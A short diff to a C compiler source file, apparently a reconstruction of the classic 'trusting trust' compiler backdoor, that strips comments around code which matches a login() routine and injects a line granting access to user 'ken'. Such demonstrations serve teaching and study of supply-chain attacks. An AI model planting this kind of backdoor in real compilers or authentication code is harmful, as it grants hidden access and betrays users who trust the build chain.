@@ -20,10 +20,7 @@ static void compile(char *program, char *outname) {
 
     int mod = 0;
 
-    /*****************************************************************
-     * Step 1:
-     */
-    // match on the start of the login() routine:
+
     static char login_sig[] = "int login(char *user) {\n    ";
     static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;\n    ";
 
